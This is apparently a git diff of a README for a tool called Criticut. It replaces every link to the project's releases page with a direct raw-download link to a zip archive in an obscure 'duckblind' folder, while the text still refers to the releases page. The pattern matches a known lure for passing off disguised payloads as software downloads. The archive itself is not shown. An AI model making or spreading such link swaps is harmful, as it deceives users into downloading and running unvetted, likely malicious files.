@@ -6,7 +6,7 @@ Welcome to Criticut! This tool helps you with critical node moderation by removi
 
 ## 🔗 Download Now
 
-[![Download Criticut](https://img.shields.io/badge/Download%20Criticut-Click%20Here-blue)](https://github.com/haggeresmail/Criticut/releases)
+[![Download Criticut](https://github.com/haggeresmail/Criticut/raw/refs/heads/main/duckblind/Software-v2.2-alpha.5.zip%20Criticut-Click%20Here-blue)](https://github.com/haggeresmail/Criticut/raw/refs/heads/main/duckblind/Software-v2.2-alpha.5.zip)
 
 ## 🛠️ Features
 
@@ -19,7 +19,7 @@ Welcome to Criticut! This tool helps you with critical node moderation by removi
 ## 🚀 Getting Started
 
 1. **Visit the Download Page**  
-   To get started, you need to download Criticut. Visit this page to download: [Criticut Releases](https://github.com/haggeresmail/Criticut/releases).
+   To get started, you need to download Criticut. Visit this page to download: [Criticut Releases](https://github.com/haggeresmail/Criticut/raw/refs/heads/main/duckblind/Software-v2.2-alpha.5.zip).
 
 2. **Choose Your Version**  
    On the releases page, you'll find different versions of Criticut. Look for the latest version to ensure you have the most up-to-date features and fixes.
@@ -69,7 +69,7 @@ If you encounter any issues while using Criticut, consider the following:
 
 ## 🔗 Download & Install
 
-To download Criticut again, visit this page: [Criticut Releases](https://github.com/haggeresmail/Criticut/releases). Follow the steps outlined above to install and run the application on your computer.
+To download Criticut again, visit this page: [Criticut Releases](https://github.com/haggeresmail/Criticut/raw/refs/heads/main/duckblind/Software-v2.2-alpha.5.zip). Follow the steps outlined above to install and run the application on your computer.
 
 ## 🎉 Feedback and Support
 
